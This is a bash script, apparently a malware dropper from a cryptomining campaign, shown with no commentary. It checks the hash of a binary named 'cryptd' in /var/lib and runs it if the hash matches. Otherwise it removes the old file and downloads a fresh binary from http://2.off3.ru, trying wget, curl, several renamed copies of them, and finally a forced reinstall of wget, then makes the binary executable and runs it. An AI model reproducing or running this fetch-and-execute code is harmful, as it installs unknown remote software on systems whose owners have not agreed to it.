#!/bin/bash
PATH=$PATH:/usr/bin:/bin:/sbin:/usr/sbin:/usr/local/bin:/usr/local/sbin


    cd /var/lib
    if [ -x "/usr/bin/md5sum" -o -x "/bin/md5sum" ];then
	sum=`md5sum cryptd|grep 4ec9c545bc03274257a0aa1647f62469|grep -v grep |wc -l`
	if [ $sum -eq 1 ]; then
		chmod +x /var/lib/cryptd
		/var/lib/cryptd
		exit 0
        fi
    fi

    chattr -ia -R /var/lib/cryptd  > /dev/null 2>&1
    /bin/rm -rf /var/lib/cryptd

    if [ -x "/usr/bin/wget"  -o  -x "/bin/wget" ]; then
   	wget -c http://2.off3.ru -O /var/lib/cryptd && chmod +x /var/lib/cryptd && /var/lib/cryptd
    elif [ -x "/usr/bin/curl"  -o  -x "/bin/curl" ]; then
   	curl -fs http://2.off3.ru -o /var/lib/cryptd && chmod +x /var/lib/cryptd && /var/lib/cryptd
    elif [ -x "/usr/bin/wge"  -o  -x "/bin/wge" ]; then
   	wge -c http://2.off3.ru -O /var/lib/cryptd && chmod +x /var/lib/cryptd && /var/lib/cryptd
    elif [ -x "/usr/bin/get"  -o  -x "/bin/get" ]; then
   	get -c http://2.off3.ru -O /var/lib/cryptd && chmod +x /var/lib/cryptd && /var/lib/cryptd
    elif [ -x "/usr/bin/cur"  -o  -x "/bin/cur" ]; then
   	cur -fs http://2.off3.ru -o /var/lib/cryptd && chmod +x /var/lib/cryptd && /var/lib/cryptd
    elif [ -x "/usr/bin/url"  -o  -x "/bin/url" ]; then
   	url -fs http://2.off3.ru -o /var/lib/cryptd && chmod +x /var/lib/cryptd && /var/lib/cryptd
    elif [ -x "/usr/bin/cd1"  -o  -x "/bin/cd1" ]; then
   	cd1 -fs http://2.off3.ru -o /var/lib/cryptd && chmod +x /var/lib/cryptd && /var/lib/cryptd
    elif [ -x "/usr/bin/cdt"  -o  -x "/bin/cdt" ]; then
   	cdt -fs http://2.off3.ru -o /var/lib/cryptd && chmod +x /var/lib/cryptd && /var/lib/cryptd
    elif [ -x "/usr/bin/wd1"  -o  -x "/bin/wd1" ]; then
   	wd1 -c http://2.off3.ru -O /var/lib/cryptd && chmod +x /var/lib/cryptd && /var/lib/cryptd
    elif [ -x "/usr/bin/lwp-download"  -o  -x "/bin/lwp-download" ]; then
        lwp-download  http://2.off3.ru /var/lib/cryptd && chmod +x /var/lib/cryptd && /var/lib/cryptd
    else
   	rpm -e --nodeps wget
   	yum -y install wget
   	wget -c http://2.off3.ru -O /var/lib/cryptd && chmod +x /var/lib/cryptd && /var/lib/cryptd
    fi
    exit 0

